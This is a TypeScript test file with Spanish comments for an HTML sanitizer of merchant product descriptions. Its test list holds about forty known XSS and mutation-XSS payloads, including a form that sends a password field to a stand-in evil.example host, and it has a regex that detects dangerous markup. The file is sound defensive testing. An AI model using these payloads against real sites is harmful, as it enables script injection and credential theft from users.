import { describe, expect, it } from "vitest";

import { sanitizeMerchantHtml } from "./sanitize";

/** Payloads clásicos (OWASP XSS Filter Evasion, PortSwigger, mutation XSS). */
const PAYLOADS = [
  "<script>alert(1)</script>",
  "<img src=x onerror=alert(1)>",
  "<svg/onload=alert(1)>",
  "<svg><script>alert(1)</script></svg>",
  "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
  "<iframe src=javascript:alert(1)></iframe>",
  "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'></iframe>",
  "<object data=javascript:alert(1)>",
  "<embed src=javascript:alert(1)>",
  "<a href=javascript:alert(1)>x</a>",
  "<a href=JaVaScRiPt:alert(1)>x</a>",
  "<a href='java&#x09;script:alert(1)'>x</a>",
  "<a href='&#106;avascript:alert(1)'>x</a>",
  "<a href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>x</a>",
  "<a href='vbscript:msgbox(1)'>x</a>",
  "<a href=//evil.example>x</a>",
  "<p onclick=alert(1)>x</p>",
  "<p style='background:url(javascript:alert(1))'>x</p>",
  "<style>@import 'https://evil.example/x.css';</style>",
  "<link rel=stylesheet href=https://evil.example/x.css>",
  "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
  "<base href=https://evil.example/>",
  "<form action=https://evil.example><input name=password></form>",
  "<button formaction=javascript:alert(1)>x</button>",
  "<details open ontoggle=alert(1)>",
  "<body onload=alert(1)>",
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  "<template><script>alert(1)</script></template>",
  "<!--<img src=x onerror=alert(1)>-->",
  "<![CDATA[<script>alert(1)</script>]]>",
  "<scr<script>ipt>alert(1)</scr</script>ipt>",
  "<div id=x tabindex=1 onfocus=alert(1) autofocus>",
  "<video><source onerror=alert(1)>",
  "<audio src=x onerror=alert(1)>",
  "<marquee onstart=alert(1)>",
  "<isindex action=javascript:alert(1) type=image>",
  "<table background=javascript:alert(1)>",
  "<td background=javascript:alert(1)>",
  '<a href="https://ok.example" onmouseover=alert(1)>x</a>',
  "<p class=evil id=evil data-x=1>x</p>",
];

const DANGEROUS =
  /<(script|style|iframe|object|embed|svg|math|img|link|meta|base|form|input|button|video|audio|template|noscript|body|div|marquee|details|isindex)\b|\son[a-z]+\s*=|javascript:|vbscript:|data:|srcdoc|style=|class=|id=|href="\/\//i;

describe("sanitizeMerchantHtml", () => {
  it.each(PAYLOADS)("neutraliza %s", (payload) => {
    const output = sanitizeMerchantHtml(payload);
    expect(output).not.toMatch(DANGEROUS);
    // Idempotente: sanitizar lo sanitizado no cambia nada (sin mutation XSS).
    expect(sanitizeMerchantHtml(output)).toBe(output);
  });

  it("conserva el formato de texto permitido", () => {
    const html =
      "<h2>Detalles</h2><p>Algodón <strong>100 %</strong> y <em>suave</em>.</p><ul><li>CH</li><li>M</li></ul>";
    expect(sanitizeMerchantHtml(html)).toBe(html);
  });

  it("los enlaces seguros llevan rel y no conservan el rel ni el target del comerciante", () => {
    expect(
      sanitizeMerchantHtml(
        '<a href="https://ok.example/guia" rel="opener" target="_blank">Guía</a>',
      ),
    ).toBe('<a href="https://ok.example/guia" rel="nofollow noopener noreferrer ugc">Guía</a>');
    expect(sanitizeMerchantHtml('<a href="mailto:hola@ok.example">Escríbenos</a>')).toContain(
      'href="mailto:hola@ok.example"',
    );
  });

  it("h1 baja a h2 (el título del producto es el único h1 de la página)", () => {
    expect(sanitizeMerchantHtml("<h1>Hola</h1>")).toBe("<h2>Hola</h2>");
  });

  it("el texto de las etiquetas descartadas no se convierte en HTML", () => {
    expect(sanitizeMerchantHtml("<p>1 &lt; 2 &amp;&amp; <b>3</b></p>")).toBe(
      "<p>1 &lt; 2 &amp;&amp; <b>3</b></p>",
    );
    expect(sanitizeMerchantHtml("<script>alert(1)</script>Hola")).toBe("Hola");
  });

  it("vacío o nulo → cadena vacía", () => {
    expect(sanitizeMerchantHtml(null)).toBe("");
    expect(sanitizeMerchantHtml(undefined)).toBe("");
    expect(sanitizeMerchantHtml("")).toBe("");
  });
});
